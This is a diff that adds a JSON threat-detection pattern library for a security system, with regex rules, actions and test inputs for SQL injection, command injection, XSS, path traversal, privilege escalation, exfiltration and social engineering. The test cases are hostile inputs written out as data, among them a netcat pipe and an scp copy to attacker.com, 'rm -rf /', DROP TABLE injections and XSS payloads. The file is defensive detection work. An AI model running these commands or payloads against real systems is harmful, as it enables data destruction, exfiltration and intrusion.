@@ -1,0 +1,750 @@
+{
+  "version": "1.0.0",
+  "timestamp": "2026-02-13T08:23:00Z",
+  "description": "Threat Detection Pattern Library for TARS Security System",
+  "categories": {
+    "sqlInjection": {
+      "enabled": true,
+      "riskLevel": "critical",
+      "patterns": [
+        {
+          "id": "sql_001",
+          "name": "Basic OR-based injection",
+          "pattern": "' OR '1'='1",
+          "regex": "'\\s+OR\\s+'[0-9]+'='[0-9]+'",
+          "action": "block",
+          "confidence": 0.95
+        },
+        {
+          "id": "sql_002",
+          "name": "UNION SELECT injection",
+          "pattern": "UNION SELECT",
+          "regex": "UNION\\s+SELECT",
+          "action": "block",
+          "confidence": 0.98
+        },
+        {
+          "id": "sql_003",
+          "name": "Comment injection",
+          "pattern": "-- or /*",
+          "regex": "(--|/\\*|\\*/)\\s*(DROP|DELETE|UPDATE|INSERT)",
+          "action": "block",
+          "confidence": 0.90
+        },
+        {
+          "id": "sql_004",
+          "name": "Blind SQL timing attack",
+          "pattern": "SLEEP() or BENCHMARK()",
+          "regex": "(SLEEP|BENCHMARK)\\s*\\([0-9]+\\)",
+          "action": "block",
+          "confidence": 0.85
+        },
+        {
+          "id": "sql_005",
+          "name": "Boolean-based blind SQL",
+          "pattern": "AND 1=1 / AND 1=2",
+          "regex": "AND\\s+[0-9]=[0-9]",
+          "action": "alert",
+          "confidence": 0.75
+        },
+        {
+          "id": "sql_006",
+          "name": "DROP TABLE injection",
+          "pattern": "DROP TABLE",
+          "regex": "DROP\\s+TABLE",
+          "action": "block",
+          "confidence": 0.99
+        },
+        {
+          "id": "sql_007",
+          "name": "DELETE FROM injection",
+          "pattern": "DELETE FROM",
+          "regex": "DELETE\\s+FROM",
+          "action": "block",
+          "confidence": 0.98
+        }
+      ],
+      "testCases": [
+        "' OR '1'='1",
+        "1' UNION SELECT password FROM users--",
+        "admin' --",
+        "1; DROP TABLE users--",
+        "1' AND SLEEP(5)--",
+        "1' AND 1=1 AND '1'='1"
+      ]
+    },
+    "commandInjection": {
+      "enabled": true,
+      "riskLevel": "critical",
+      "patterns": [
+        {
+          "id": "cmd_001",
+          "name": "Semicolon command chaining",
+          "pattern": "; [command]",
+          "regex": ";\\s*[a-zA-Z_][a-zA-Z0-9_-]*",
+          "action": "block",
+          "confidence": 0.95
+        },
+        {
+          "id": "cmd_002",
+          "name": "Pipe to command",
+          "pattern": "| [command]",
+          "regex": "\\|\\s*[a-zA-Z_][a-zA-Z0-9_-]*",
+          "action": "block",
+          "confidence": 0.98
+        },
+        {
+          "id": "cmd_003",
+          "name": "OR operator (||)",
+          "pattern": "|| [command]",
+          "regex": "\\|\\|\\s*[a-zA-Z_]",
+          "action": "block",
+          "confidence": 0.95
+        },
+        {
+          "id": "cmd_004",
+          "name": "AND operator (&&)",
+          "pattern": "&& [command]",
+          "regex": "&&\\s*[a-zA-Z_]",
+          "action": "block",
+          "confidence": 0.95
+        },
+        {
+          "id": "cmd_005",
+          "name": "Backtick execution",
+          "pattern": "`[command]`",
+          "regex": "`[^`]*`",
+          "action": "block",
+          "confidence": 0.99
+        },
+        {
+          "id": "cmd_006",
+          "name": "Dollar parenthesis execution",
+          "pattern": "$([command])",
+          "regex": "\\$\\([^)]*\\)",
+          "action": "block",
+          "confidence": 0.99
+        },
+        {
+          "id": "cmd_007",
+          "name": "Process substitution",
+          "pattern": "<(command)",
+          "regex": "<\\([^)]*\\)",
+          "action": "block",
+          "confidence": 0.98
+        },
+        {
+          "id": "cmd_008",
+          "name": "Null byte injection",
+          "pattern": "[command]\\x00",
+          "regex": "\\x00",
+          "action": "block",
+          "confidence": 0.90
+        },
+        {
+          "id": "cmd_009",
+          "name": "Newline injection",
+          "pattern": "npm install\\n rm -rf /",
+          "regex": "[\\r\\n]\\s*[a-zA-Z_]",
+          "action": "block",
+          "confidence": 0.85
+        }
+      ],
+      "testCases": [
+        "npm install; rm -rf /",
+        "npm install | nc attacker.com 4444",
+        "npm install || malicious_command",
+        "npm install && touch /tmp/pwned",
+        "npm install `whoami`",
+        "npm install $(whoami)",
+        "npm install <(whoami)",
+        "npm install\\x00.php"
+      ]
+    },
+    "xssAttacks": {
+      "enabled": true,
+      "riskLevel": "high",
+      "patterns": [
+        {
+          "id": "xss_001",
+          "name": "Script tag injection",
+          "pattern": "<script>",
+          "regex": "<script[^>]*>",
+          "action": "block",
+          "confidence": 0.99
+        },
+        {
+          "id": "xss_002",
+          "name": "Event handler injection",
+          "pattern": "onerror=",
+          "regex": "on[a-z]+\\s*=",
+          "action": "block",
+          "confidence": 0.98
+        },
+        {
+          "id": "xss_003",
+          "name": "JavaScript protocol",
+          "pattern": "javascript:",
+          "regex": "javascript:\\s*[a-zA-Z]",
+          "action": "block",
+          "confidence": 0.99
+        },
+        {
+          "id": "xss_004",
+          "name": "Data protocol with base64",
+          "pattern": "data:text/html;base64",
+          "regex": "data:text\\/html;base64",
+          "action": "block",
+          "confidence": 0.95
+        },
+        {
+          "id": "xss_005",
+          "name": "SVG script injection",
+          "pattern": "<svg onload=",
+          "regex": "<svg[^>]*onload",
+          "action": "block",
+          "confidence": 0.98
+        },
+        {
+          "id": "xss_006",
+          "name": "Image tag with onerror",
+          "pattern": "<img onerror=",
+          "regex": "<img[^>]*onerror",
+          "action": "block",
+          "confidence": 0.97
+        },
+        {
+          "id": "xss_007",
+          "name": "Iframe injection",
+          "pattern": "<iframe>",
+          "regex": "<iframe[^>]*>",
+          "action": "block",
+          "confidence": 0.95
+        }
+      ],
+      "testCases": [
+        "<script>alert('xss')</script>",
+        "<img src=x onerror='alert(1)'>",
+        "<body onload='alert(1)'>",
+        "javascript:alert('xss')",
+        "<svg onload='alert(1)'>",
+        "<iframe src='javascript:alert(1)'>",
+        "data:text/html;base64,PGFsZXJ0KCd4c3MnKT4="
+      ]
+    },
+    "pathTraversal": {
+      "enabled": true,
+      "riskLevel": "high",
+      "patterns": [
+        {
+          "id": "path_001",
+          "name": "Directory traversal ..",
+          "pattern": "../",
+          "regex": "\\.{2,}[\\\\\\/]",
+          "action": "block",
+          "confidence": 0.98
+        },
+        {
+          "id": "path_002",
+          "name": "Encoded traversal %2e%2e",
+          "pattern": "%2e%2e%2f",
+          "regex": "%2e%2e",
+          "action": "block",
+          "confidence": 0.95
+        },
+        {
+          "id": "path_003",
+          "name": "Double encoded traversal",
+          "pattern": "%252e%252e%252f",
+          "regex": "%25[2e]{2}",
+          "action": "block",
+          "confidence": 0.90
+        },
+        {
+          "id": "path_004",
+          "name": "Absolute path access",
+          "pattern": "/etc/passwd",
+          "regex": "^[\\\\\\/]",
+          "action": "block",
+          "confidence": 0.95
+        },
+        {
+          "id": "path_005",
+          "name": "Home directory traversal",
+          "pattern": "~/",
+          "regex": "^~[\\\\\\/]",
+          "action": "block",
+          "confidence": 0.90
+        },
+        {
+          "id": "path_006",
+          "name": "Windows drive letters",
+          "pattern": "C:",
+          "regex": "^[a-zA-Z]:",
+          "action": "block",
+          "confidence": 0.85
+        }
+      ],
+      "testCases": [
+        "../../etc/passwd",
+        "..\\..\\windows\\system32",
+        "%2e%2e%2fetc%2fpasswd",
+        "/etc/passwd",
+        "~/private_keys",
+        "C:\\windows\\system32"
+      ]
+    },
+    "privilegeEscalation": {
+      "enabled": true,
+      "riskLevel": "critical",
+      "patterns": [
+        {
+          "id": "privesc_001",
+          "name": "Sudo command execution",
+          "pattern": "sudo",
+          "regex": "^sudo\\s+",
+          "action": "block",
+          "confidence": 0.99,
+          "requiresApproval": true
+        },
+        {
+          "id": "privesc_002",
+          "name": "Switch user (su)",
+          "pattern": "su",
+          "regex": "^su\\s+",
+          "action": "block",
+          "confidence": 0.98
+        },
+        {
+          "id": "privesc_003",
+          "name": "Setuid manipulation",
+          "pattern": "chmod 4755",
+          "regex": "chmod\\s+[24][0-7]{3}",
+          "action": "alert",
+          "confidence": 0.95
+        },
+        {
+          "id": "privesc_004",
+          "name": "LD_PRELOAD injection",
+          "pattern": "LD_PRELOAD=",
+          "regex": "LD_PRELOAD\\s*=",
+          "action": "block",
+          "confidence": 0.99
+        },
+        {
+          "id": "privesc_005",
+          "name": "LD_LIBRARY_PATH injection",
+          "pattern": "LD_LIBRARY_PATH=",
+          "regex": "LD_LIBRARY_PATH\\s*=",
+          "action": "block",
+          "confidence": 0.98
+        },
+        {
+          "id": "privesc_006",
+          "name": "Setcap capability",
+          "pattern": "setcap",
+          "regex": "setcap\\s+",
+          "action": "block",
+          "confidence": 0.98
+        },
+        {
+          "id": "privesc_007",
+          "name": "Critical file permission changes",
+          "pattern": "chmod 644 /etc/",
+          "regex": "chmod\\s+[0-7]{3}\\s+[\\\\\\/]etc[\\\\\\/]",
+          "action": "alert",
+          "confidence": 0.99
+        }
+      ],
+      "testCases": [
+        "sudo npm start",
+        "su - root",
+        "chmod 4755 /usr/bin/app",
+        "LD_PRELOAD=/tmp/mal.so node",
+        "setcap cap_sys_admin+ep ./binary"
+      ]
+    },
+    "dataExfiltration": {
+      "enabled": true,
+      "riskLevel": "critical",
+      "patterns": [
+        {
+          "id": "exfil_001",
+          "name": "Database dump - MySQL",
+          "pattern": "mysqldump",
+          "regex": "mysqldump\\s+",
+          "action": "requireApproval",
+          "confidence": 0.99
+        },
+        {
+          "id": "exfil_002",
+          "name": "Database dump - PostgreSQL",
+          "pattern": "pg_dump",
+          "regex": "pg_dump\\s+",
+          "action": "requireApproval",
+          "confidence": 0.99
+        },
+        {
+          "id": "exfil_003",
+          "name": "Database dump - MongoDB",
+          "pattern": "mongodump",
+          "regex": "mongodump\\s+",
+          "action": "requireApproval",
+          "confidence": 0.99
+        },
+        {
+          "id": "exfil_004",
+          "name": "SCP to external host",
+          "pattern": "scp file user@host",
+          "regex": "scp\\s+[^\\s]+\\s+[^@]*@",
+          "action": "alert",
+          "confidence": 0.95,
+          "requiresWhitelist": true
+        },
+        {
+          "id": "exfil_005",
+          "name": "SFTP to external",
+          "pattern": "sftp user@host",
+          "regex": "sftp\\s+[^@]*@",
+          "action": "alert",
+          "confidence": 0.93
+        },
+        {
+          "id": "exfil_006",
+          "name": "Curl with data to external",
+          "pattern": "curl -d @file http://external",
+          "regex": "curl\\s+[^\\s]*-d[^\\s]*@",
+          "action": "block",
+          "confidence": 0.90
+        },
+        {
+          "id": "exfil_007",
+          "name": "Archive creation",
+          "pattern": "tar -czf data.tar.gz",
+          "regex": "(tar|zip|7z|rar)\\s+.*[a-zA-Z0-9_-]+\\.(tar\\.gz|zip|7z|rar)",
+          "action": "alert",
+          "confidence": 0.85
+        },
+        {
+          "id": "exfil_008",
+          "name": "Large output redirect",
+          "detection": "output_size > 100MB",
+          "action": "alert",
+          "confidence": 0.80
+        },
+        {
+          "id": "exfil_009",
+          "name": "Netcat listener/exfil",
+          "pattern": "nc | ncat | netcat",
+          "regex": "(nc|ncat|netcat)\\s+[^\\s]*-l",
+          "action": "block",
+          "confidence": 0.95
+        },
+        {
+          "id": "exfil_010",
+          "name": "Sensitive file search",
+          "pattern": "find *password* or find *secret*",
+          "regex": "find\\s+.*(-name|-)\\s+['\\\"]?\\*[a-z_]*(password|secret|key|token)[a-z_]*",
+          "action": "alert",
+          "confidence": 0.88
+        }
+      ],
+      "testCases": [
+        "mysqldump -u root -p production_db > backup.sql",
+        "pg_dump production | gzip > backup.gz",
+        "mongodump --db production --out dump",
+        "scp database.zip user@attacker.com:/tmp/",
+        "tar -czf sensitive.tar.gz /var/www/",
+        "find . -name '*password*' -type f"
+      ]
+    },
+    "socialEngineering": {
+      "enabled": true,
+      "riskLevel": "high",
+      "patterns": [
+        {
+          "id": "se_001",
+          "name": "Password/credential request",
+          "keywords": [
+            "enter password",
+            "verify account",
+            "confirm identity",
+            "re-authenticate",
+            "update credentials",
+            "verify credentials"
+          ],
+          "action": "block",
+          "confidence": 0.95,
+          "reason": "Potential credential harvesting"
+        },
+        {
+          "id": "se_002",
+          "name": "Urgency/pressure language",
+          "keywords": [
+            "immediately",
+            "urgent",
+            "must now",
+            "before expires",
+            "act quickly",
+            "time running out",
+            "do not delay",
+            "critical",
+            "asap"
+          ],
+          "action": "alert",
+          "confidence": 0.75,
+          "threshold": 3,
+          "thresholdType": "keyword_count"
+        },
+        {
+          "id": "se_003",
+          "name": "Authority impersonation",
+          "keywords": [
+            "from admin",
+            "from cto",
+            "from cfo",
+            "official request",
+            "authorized personnel",
+            "management directive",
+            "company directive",
+            "from security team"
+          ],
+          "action": "alert",
+          "confidence": 0.90,
+          "requiresManualReview": true
+        },
+        {
+          "id": "se_004",
+          "name": "Suspicious file request",
+          "keywords": [
+            "send file",
+            "upload document",
+            "share folder",
+            "forward attachment",
+            "send database",
+            "export data",
+            "backup files"
+          ],
+          "action": "block",
+          "confidence": 0.85,
+          "exceptions": ["approved_recipients"]
+        },
+        {
+          "id": "se_005",
+          "name": "Permission escalation request",
+          "keywords": [
+            "grant elevated access",
+            "make admin",
+            "promote permissions",
+            "bypass restriction",
+            "disable check",
+            "remove limitation"
+          ],
+          "action": "alert",
+          "confidence": 0.92,
+          "requiresApproval": true
+        },
+        {
+          "id": "se_006",
+          "name": "External resource request",
+          "keywords": [
+            "external party",
+            "third party",
+            "vendor request",
+            "partner needs",
+            "auditor request"
+          ],
+          "action": "alert",
+          "confidence": 0.80,
+          "requiresVerification": true
+        }
+      ],
+      "testCases": [
+        "Please enter your password to verify your account",
+        "URGENT: Update admin password immediately or system will be locked",
+        "From: CTO - Grant database admin access for security audit",
+        "Please send all customer data files for backup",
+        "Need elevated access to install required software"
+      ]
+    },
+    "rateLimitViolations": {
+      "enabled": true,
+      "riskLevel": "medium",
+      "patterns": [
+        {
+          "id": "rate_001",
+          "name": "Brute force login",
+          "detection": "failed_logins >= 5 in 300s",
+          "action": "lockAccount",
+          "lockDuration": 900,
+          "confidence": 0.99
+        },
+        {
+          "id": "rate_002",
+          "name": "API request flood",
+          "detection": "requests >= 10000 in 3600s",
+          "action": "throttle",
+          "confidence": 0.95
+        },
+        {
+          "id": "rate_003",
+          "name": "Command execution spam",
+          "detection": "commands >= 100 in 3600s",
+          "action": "alert",
+          "confidence": 0.80
+        },
+        {
+          "id": "rate_004",
+          "name": "Data export abuse",
+          "detection": "exports >= 10 in 3600s",
+          "action": "requireApproval",
+          "confidence": 0.85
+        },
+        {
+          "id": "rate_005",
+          "name": "MFA attempt flooding",
+          "detection": "mfa_attempts >= 5 in 300s",
+          "action": "block",
+          "lockDuration": 600,
+          "confidence": 0.98
+        }
+      ],
+      "testCases": [
+        "6 failed logins in 5 minutes",
+        "10001 API requests in 1 hour",
+        "101 commands executed in 1 hour (auth user)",
+        "11 data exports in 1 hour"
+      ]
+    },
+    "anomalousActivity": {
+      "enabled": true,
+      "riskLevel": "medium",
+      "patterns": [
+        {
+          "id": "anom_001",
+          "name": "Unusual login location",
+          "detection": "login_from_new_ip_outside_normal_range",
+          "action": "alert",
+          "confidence": 0.75,
+          "requiresMFA": true
+        },
+        {
+          "id": "anom_002",
+          "name": "Login at unusual time",
+          "detection": "login_outside_business_hours_for_user",
+          "action": "alert",
+          "confidence": 0.70
+        },
+        {
+          "id": "anom_003",
+          "name": "Bulk data access",
+          "detection": "read_count >= 50 in 60s",
+          "action": "alert",
+          "confidence": 0.80
+        },
+        {
+          "id": "anom_004",
+          "name": "Privilege usage increase",
+          "detection": "elevated_mode_requests >= 3x baseline in 24h",
+          "action": "alert",
+          "confidence": 0.75
+        },
+        {
+          "id": "anom_005",
+          "name": "New device connection",
+          "detection": "ssh_from_unknown_device",
+          "action": "alert",
+          "confidence": 0.80,
+          "requiresMFA": true
+        }
+      ]
+    }
+  },
+  "actionMap": {
+    "log": {
+      "description": "Log the incident, do not block",
+      "severity": "info",
+      "notifySecurityTeam": false
+    },
+    "alert": {
+      "description": "Log and alert security team",
+      "severity": "warning",
+      "notifySecurityTeam": true,
+      "requiresManualReview": false
+    },
+    "requireApproval": {
+      "description": "Block action, require admin approval",
+      "severity": "high",
+      "notifySecurityTeam": true,
+      "requiresManualReview": true,
+      "escalationLevel": 2
+    },
+    "block": {
+      "description": "Immediately block, alert team",
+      "severity": "critical",
+      "notifySecurityTeam": true,
+      "requiresManualReview": true,
+      "escalationLevel": 3
+    },
+    "throttle": {
+      "description": "Rate limit requests, alert",
+      "severity": "medium",
+      "notifySecurityTeam": false
+    },
+    "lockAccount": {
+      "description": "Lock account, alert, require admin unlock",
+      "severity": "critical",
+      "notifySecurityTeam": true,
+      "requiresManualReview": true,
+      "escalationLevel": 3
+    }
+  },
+  "responseTemplates": {
+    "sqlInjection": {
+      "userMessage": "Invalid input detected. Please check your input and try again.",
+      "auditMessage": "SQL injection attempt detected and blocked",
+      "alertSeverity": "critical",
+      "action": "block"
+    },
+    "commandInjection": {
+      "userMessage": "Invalid command syntax. Special characters not allowed.",
+      "auditMessage": "Command injection attempt detected and blocked",
+      "alertSeverity": "critical",
+      "action": "block"
+    },
+    "privilegeEscalation": {
+      "userMessage": "This operation requires elevated privileges and approval.",
+      "auditMessage": "Privilege escalation attempt detected",
+      "alertSeverity": "critical",
+      "action": "requireApproval"
+    },
+    "dataExfiltration": {
+      "userMessage": "Large data operations require approval. An approval request has been sent.",
+      "auditMessage": "Data exfiltration attempt detected",
+      "alertSeverity": "critical",
+      "action": "requireApproval"
+    },
+    "rateLimitViolation": {
+      "userMessage": "Rate limit exceeded. Please wait before retrying.",
+      "auditMessage": "Rate limit violation detected",
+      "alertSeverity": "medium",
+      "action": "throttle"
+    },
+    "socialEngineering": {
+      "userMessage": "This request appears suspicious. Please contact your administrator.",
+      "auditMessage": "Social engineering attempt detected",
+      "alertSeverity": "high",
+      "action": "alert"
+    }
+  },
+  "configuration": {
+    "evaluationEngine": "regex + context",
+    "matchingStrategy": "all_patterns",
+    "cachingEnabled": true,
+    "cacheTtlSeconds": 300,
+    "realTimeAnalysis": true,
+    "updateInterval": 60,
+    "enableMachineLearning": true,
+    "anomalyDetectionThreshold": 0.75
+  }
+}
